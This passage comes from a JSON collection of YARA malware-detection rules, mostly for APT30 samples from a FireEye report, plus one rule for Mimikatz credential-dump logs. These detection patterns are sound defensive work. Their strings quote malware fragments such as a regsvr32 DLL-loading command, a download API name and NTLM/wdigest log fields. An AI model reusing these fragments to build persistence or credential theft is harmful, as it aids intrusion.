e62a63307deead5c9fcca6b9a2d51fb0","minimum_yara":"1.7","name":"APT30_Sample_28_RID2BE3","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"d31f17012fbb5f3982902660788945c2","score":95,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_29_RID2BE4 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 1b81b80ff0edf57da2440456d516cc90\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LSSAS.exe\" fullword ascii\n      $s1 = \"Software\\\\Microsoft\\\\FlashDiskInf\" fullword ascii\n      $s2 = \".petite\" fullword ascii\n      $s3 = \"MicrosoftFlashExit\" fullword ascii\n      $s4 = \"MicrosoftFlashHaveExit\" fullword ascii\n      $s5 = \"MicrosoftFlashHaveAck\" fullword ascii\n      $s6 = \"\\\\driver32\" fullword ascii\n      $s7 = \"MicrosoftFlashZJ\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:51","description":"FireEye APT30 Report Sample - file 1b81b80ff0edf57da2440456d516cc90","minimum_yara":"1.7","name":"APT30_Sample_29_RID2BE4","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"35f722d2d0fdc6212953d8c046d55a74","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_30_RID2BDC : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file bf8616bbed6d804a3dea09b230c2ab0c\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"5.1.2600.2180 (xpsp_sp2_rtm.040803-2158)\" fullword wide\n      $s3 = \"RnhwtxtkyLRRMf{jJ}ny\" fullword ascii\n      $s4 = \"RnhwtxtkyLRRJ}ny\" fullword ascii\n      $s5 = \"ZRLDownloadToFileA\" fullword ascii\n      $s9 = \"5.1.2600.2180\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:31","description":"FireEye APT30 Report Sample - file bf8616bbed6d804a3dea09b230c2ab0c","minimum_yara":"1.7","name":"APT30_Sample_30_RID2BDC","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"1e06ca1cc167639ccac881b93e5e0eb2","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_31_RID2BDD : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file d8e68db503f4155ed1aeba95d1f5e3e4\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\ZJRsv.tem\" fullword ascii\n      $s1 = \"forceguest\" fullword ascii\n      $s4 = \"\\\\$NtUninstallKB570317$\" fullword ascii\n      $s8 = \"[Can'tGetIP]\" fullword ascii\n      $s14 = \"QWERTY:,`/\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:41","description":"FireEye APT30 Report Sample - file d8e68db503f4155ed1aeba95d1f5e3e4","minimum_yara":"1.7","name":"APT30_Sample_31_RID2BDD","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"a27a27964a61ad2d78eddf76eac6ab65","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_J_RID2C1E : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file baff5262ae01a9217b10fcd5dad9d1d5\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Launcher.EXE\" fullword wide\n      $s1 = \"Symantec Security Technologies\" fullword wide\n      $s2 = \"\\\\Symantec LiveUpdate.lnk\" fullword ascii\n      $s3 = \"Symantec Service Framework\" fullword wide\n      $s4 = \"\\\\ccSvcHst.exe\" fullword ascii\n      $s5 = \"\\\\wssfmgr.exe\" fullword ascii\n      $s6 = \"Symantec Corporation\" fullword wide\n      $s7 = \"\\\\5.1.0.29\" fullword ascii\n      $s8 = \"\\\\Engine\" fullword ascii\n      $s9 = \"Copyright (C) 2000-2010 Symantec Corporation. All rights reserved.\" fullword wide\n      $s10 = \"Symantec LiveUpdate\" fullword ascii\n      $s11 = \"\\\\Norton360\" fullword ascii\n      $s15 = \"BinRes\" fullword ascii\n      $s16 = \"\\\\readme.lz\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:35:31","description":"FireEye APT30 Report Sample - file baff5262ae01a9217b10fcd5dad9d1d5","minimum_yara":"1.7","name":"APT30_Generic_J_RID2C1E","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"d8843c47f355a0126011a2bdf6e899b1","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Microfost_RID2C6E : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 310a4a62ba3765cbf8e8bbb9f324c503\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Copyright (c) 2007 Microfost All Rights Reserved\" fullword wide\n      $s2 = \"Microfost\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:48:51","description":"FireEye APT30 Report Sample - file 310a4a62ba3765cbf8e8bbb9f324c503","minimum_yara":"1.7","name":"APT30_Microfost_RID2C6E","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"8d43f03efce7c13905060a6d5239dc1d","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_K_RID2C1F : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file b5a343d11e1f7340de99118ce9fc1bbb\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Maybe a Encrypted Flash\" fullword ascii\n      $s0 = \"C:\\\\Program Files\\\\Common Files\\\\System\\\\wab32\" fullword ascii\n      $s1 = \"\\\\TEMP\\\\\" fullword ascii\n      $s2 = \"\\\\Temporary Internet Files\\\\\" fullword ascii\n      $s5 = \"%s Size:%u Bytes\" fullword ascii\n      $s7 = \"$.DATA$\" fullword ascii\n      $s10 = \"? Size:%u By s\" fullword ascii\n      $s12 = \"Maybe a Encrypted Flash\" fullword ascii\n      $s14 = \"Name:%-32s\" fullword ascii\n      $s15 = \"NickName:%-32s\" fullword ascii\n      $s19 = \"Email:%-32s\" fullword ascii\n      $s21 = \"C:\\\\Prog\" ascii\n      $s22 = \"$LDDATA$\" ascii\n      $s31 = \"Copy File %s OK!\" fullword ascii\n      $s32 = \"%s Space:%uM,FreeSpace:%uM\" fullword ascii\n      $s34 = \"open=%s\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and ( all of ( $x* ) and 3 of ( $s* ) )\n}","date":"2015-04-03 09:35:41","description":"FireEye APT30 Report Sample - file b5a343d11e1f7340de99118ce9fc1bbb","minimum_yara":"1.7","name":"APT30_Generic_K_RID2C1F","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"7b54039f2298405d3426794afbe69948","score":75,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_33_RID2BDF : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 5eaf3deaaf2efac92c73ada82a651afe\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Version 4.7.3001\" fullword wide\n      $s1 = \"msmsgr.exe\" fullword wide\n      $s2 = \"MYUSER32.dll\" fullword ascii\n      $s3 = \"MYADVAPI32.dll\" fullword ascii\n      $s4 = \"CeleWare.NET1\" fullword ascii\n      $s6 = \"MYMSVCRT.dll\" fullword ascii\n      $s7 = \"Microsoft(R) is a registered trademark of Microsoft Corporation in the\" wide\n      $s8 = \"WWW.CeleWare.NET1\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 6 of them\n}","date":"2015-04-03 09:25:01","description":"FireEye APT30 Report Sample - file 5eaf3deaaf2efac92c73ada82a651afe","minimum_yara":"1.7","name":"APT30_Sample_33_RID2BDF","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"70e471485ef80e48097b1839332faa4e","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_34_RID2BE0 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file a9e8e402a7ee459e4896d0ba83543684\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:11\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"dizhi.gif\" ascii\n      $s1 = \"eagles.vip.nse\" ascii\n      $s4 = \"o%S:S0\" ascii\n      $s5 = \"la/4.0\" ascii\n      $s6 = \"s#!<4!2>s02==<'s1\" ascii\n      $s7 = \"HlobalAl\" ascii\n      $s9 = \"vcMicrosoftHaveAck7\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:11","description":"FireEye APT30 Report Sample - file a9e8e402a7ee459e4896d0ba83543684","minimum_yara":"1.7","name":"APT30_Sample_34_RID2BE0","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"3170af458456cb72a3a27d9e7d349767","score":95,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_35_RID2BE1 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 414854a9b40f7757ed7bfc6a1b01250f\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:21\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WhBoyIEXPLORE.EXE.exe\" fullword ascii\n      $s5 = \"Startup>A\" fullword ascii\n      $s18 = \"olhelp32Snapshot\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:21","description":"FireEye APT30 Report Sample - file 414854a9b40f7757ed7bfc6a1b01250f","minimum_yara":"1.7","name":"APT30_Sample_35_RID2BE1","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"8e4583021e94a2f804e4de286a81a011","score":95,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_1_RID2BAA : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 4c6b21e98ca03e0ef0910e07cef45dac\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:11\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"#hostid\" fullword ascii\n      $s1 = \"\\\\Windows\\\\C\" ascii\n      $s5 = \"TimUmove\" fullword ascii\n      $s6 = \"Moziea/4.0 (c\" fullword ascii\n      $s7 = \"StartupNA\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:16:11","description":"FireEye APT30 Report Sample - file 4c6b21e98ca03e0ef0910e07cef45dac","minimum_yara":"1.7","name":"APT30_Sample_1_RID2BAA","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"1b9d4a94c6f1bcb1e82a63a6365484c7","score":95,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_1_RID2C05 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:31:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s\\\\%s.txt\" fullword\n      $s1 = \"\\\\ldsysinfo.txt\" fullword\n      $s4 = \"(Extended Wansung)\" fullword\n      $s6 = \"Computer Name:\" fullword\n      $s7 = \"%s %uKB %04u-%02u-%02u %02u:%02u\" fullword\n      $s8 = \"ASSAMESE\" fullword\n      $s9 = \"BELARUSIAN\" fullword\n      $s10 = \"(PR China)\" fullword\n      $s14 = \"(French)\" fullword\n      $s15 = \"AdvancedServer\" fullword\n      $s16 = \"DataCenterServer\" fullword\n      $s18 = \"(Finland)\" fullword\n      $s19 = \"%s %04u-%02u-%02u %02u:%02u\" fullword\n      $s20 = \"(Chile)\" fullword\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:31:21","description":"FireEye APT30 Report Sample","minimum_yara":"1.7","name":"APT30_Generic_1_RID2C05","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"fe1d94587cebf1518cc407ffe6ab38f4","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_2_RID2C06 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - from many files\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:31:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s\\\\%s\\\\KB985109.log\" fullword\n      $s1 = \"%s\\\\%s\\\\KB989109.log\" fullword\n      $s2 = \"Opera.exe\" fullword wide\n      $s3 = \"%s:All online success on %u!\" fullword\n      $s4 = \"%s:list online success on %u!\" fullword\n      $s5 = \"%s:All online fail!\" fullword\n      $s6 = \"Copyright Opera Software 1995-\" fullword wide\n      $s7 = \"%s:list online fail!\" fullword\n      $s8 = \"OnlineTmp.txt\" fullword\n      $s9 = \"Opera Internet Browser\" fullword wide\n      $s12 = \"Opera Software\" fullword wide\n      $s15 = \"Check lan have done!!!\" fullword\n      $s16 = \"List End.\" fullword\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:31:31","description":"FireEye APT30 Report Sample - from many files","minimum_yara":"1.7","name":"APT30_Generic_2_RID2C06","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"5da8fa4357c3fd250ce879b543b61a28","score":60,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_3_RID2C07 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - from files 6e689351d94389ac6fdc341b859c7f6f, a813eba27b2166620bd75029cc1f04b0, b4ae0004094b37a40978ef06f311a75e\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:31:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Acrobat.exe\" fullword wide\n      $s14 = \"********************************\" fullword\n      $s16 = \"FFFF:>>>>>>>>>>>>>>>>>@\" fullword\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:31:41","description":"FireEye APT30 Report Sample - from files 6e689351d94389ac6fdc341b859c7f6f, a813eba27b2166620bd75029cc1f04b0, b4ae0004094b37a40978ef06f311a75e","minimum_yara":"1.7","name":"APT30_Generic_3_RID2C07","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"bf9bb849cd6b71f57dc258a0f4c815b0","score":60,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_4_RID2C08 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:31:51\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"del NetEagle_Scout.bat\" fullword\n      $s1 = \"NetEagle_Scout.bat\" fullword\n      $s2 = \"\\\\visit.exe\" fullword\n      $s3 = \"\\\\System.exe\" fullword\n      $s4 = \"\\\\System.dat\" fullword\n      $s5 = \"\\\\ieupdate.exe\" fullword\n      $s6 = \"GOTO ERROR\" fullword\n      $s7 = \":ERROR\" fullword\n      $s9 = \"IF EXIST \" fullword\n      $s10 = \"ioiocn\" fullword\n      $s11 = \"SetFileAttribute\" fullword\n      $s12 = \"le_0*^il\" fullword\n      $s13 = \"le_.*^il\" fullword\n      $s14 = \"le_-*^il\" fullword\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:31:51","description":"FireEye APT30 Report Sample","minimum_yara":"1.7","name":"APT30_Generic_4_RID2C08","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"cc1fc38876cf2475a899b4bd8260fac4","score":85,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_5_RID2C09 : APT DEMO FILE GEN T1117 {\n   meta:\n      description = \"FireEye APT30 Report Sample - from files 592381dfa14e61bce089cd00c9b118ae, b493ad490b691b8732983dcca8ea8b6f, b83d43e3b2f0b0a0e5cc047ef258c2cb\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN, T1117\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"regsvr32 /s \\\"%ProgramFiles%\\\\Norton360\\\\Engine\\\\5.1.0.29\\\\ashelper.dll\\\"\" fullword\n      $s1 = \"name=\\\"ftpserver.exe\\\"/>\" fullword\n      $s2 = \"LiveUpdate.EXE\" fullword wide\n      $s3 = \"<description>FTP Explorer</description>\" fullword\n      $s4 = \"\\\\ashelper.dll\" fullword\n      $s5 = \"LiveUpdate\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:32:01","description":"FireEye APT30 Report Sample - from files 592381dfa14e61bce089cd00c9b118ae, b493ad490b691b8732983dcca8ea8b6f, b83d43e3b2f0b0a0e5cc047ef258c2cb","minimum_yara":"1.7","name":"APT30_Generic_5_RID2C09","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"8d9c92e796d19542b77a5f82e70f8591","score":65,"tags":["APT","T1117","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_6_RID2C0A : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - from files 168d207d0599ed0bb5bcfca3b3e7a9d3, 1e6ee89fddcf23132ee12802337add61, 5dd625af837e164dd2084b1f44a45808\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GetStar\" fullword\n      $s1 = \".rdUaS\" fullword\n      $s2 = \"%sOTwp/&A\\\\L\" fullword\n      $s3 = \"a Encrt% Flash Disk\" fullword\n      $s4 = \"ypeAutoRuChec\" fullword\n      $s5 = \"NoDriveT\" fullword\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:32:11","description":"FireEye APT30 Report Sample - from files 168d207d0599ed0bb5bcfca3b3e7a9d3, 1e6ee89fddcf23132ee12802337add61, 5dd625af837e164dd2084b1f44a45808","minimum_yara":"1.7","name":"APT30_Generic_6_RID2C0A","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"991e6f873e99c148692e9159583b73cf","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_7_RID2C0B : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - from files 853a20f5fc6d16202828df132c41a061, 9c0cad1560cd0ffe2aa570621ef7d0a0, b590c15499448639c2748ff9e0d214b2\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Xjapor_*ata\" fullword\n      $s2 = \"Xjapor_o*ata\" fullword\n      $s4 = \"Ouopai\" fullword\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:32:21","description":"FireEye APT30 Report Sample - from files 853a20f5fc6d16202828df132c41a061, 9c0cad1560cd0ffe2aa570621ef7d0a0, b590c15499448639c2748ff9e0d214b2","minimum_yara":"1.7","name":"APT30_Generic_7_RID2C0B","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"4aee9ac419c2d05737a23dfcdffd1cb4","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_8_RID2C0C : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - from files 7c307ca84f922674049c0c43ca09bec1, b8617302180d331e197cc0433fc5023d, e6289e7f9f26be692cbe6f335a706014\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Windows NT4.0\" fullword\n      $s1 = \"Windows NT3.51\" fullword\n      $s2 = \"%d;%d;%d;%ld;%ld;%ld;\" fullword\n      $s3 = \"%s %d.%d Build%d %s\" fullword\n      $s4 = \"MSAFD Tcpip [TCP/IP]\" fullword\n      $s5 = \"SQSRSS\" fullword\n      $s8 = \"WM_COMP\" fullword\n      $s9 = \"WM_MBU\" fullword\n      $s11 = \"WM_GRID\" fullword\n      $s12 = \"WM_RBU\" fullword\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:32:31","description":"FireEye APT30 Report Sample - from files 7c307ca84f922674049c0c43ca09bec1, b8617302180d331e197cc0433fc5023d, e6289e7f9f26be692cbe6f335a706014","minimum_yara":"1.7","name":"APT30_Generic_8_RID2C0C","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"05b8fb856120648c596b8ceec7a510b8","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_9_RID2C0D : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s\\\\%s\\\\$NtRecDoc$\" fullword\n      $s1 = \"%s(%u)%s\" fullword\n      $s2 = \"http://%s%s%s\" fullword\n      $s3 = \"1.9.1.17\" fullword wide\n      $s4 = \"(C)Firefox and Mozilla Developers, according to the MPL 1.1/GPL 2.0/LGPL\" wide\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:32:41","description":"FireEye APT30 Report Sample","minimum_yara":"1.7","name":"APT30_Generic_9_RID2C0D","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"73e89128560cf46d4230faed5a457b46","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule Mimikatz_Logfile_RID2D78 : DEMO HKTL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Detects a log file generated by malicious hack tool mimikatz\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-03-31 10:33:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SID               :\" ascii fullword\n      $s2 = \"* NTLM     :\" ascii fullword\n      $s3 = \"Authentication Id :\" ascii fullword\n      $s4 = \"wdigest :\" ascii fullword\n   condition: \n      all of them\n}","date":"2015-03-31 10:33:11","description":"Detects a log file generated by malicious hack tool mimikatz","minimum_yara":"1.7","name":"Mimikatz_Logfile_RID2D78","reference":"-","required_modules":[],"rule_hash":"2a1be474c623d0d66444c261b0b0921e","score":80,"tags":["T1178","T1097","T1075","DEMO","T1003","HKTL"]},{"author":"Florian Roth","content":"rule CN_Toolset_sig_1433_135_sqlr_RID30D0 : CHINA DEMO HKTL {\n   meta:\n      description = \"Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n      date = \"2015-03-30 12:55:51\"\n      score 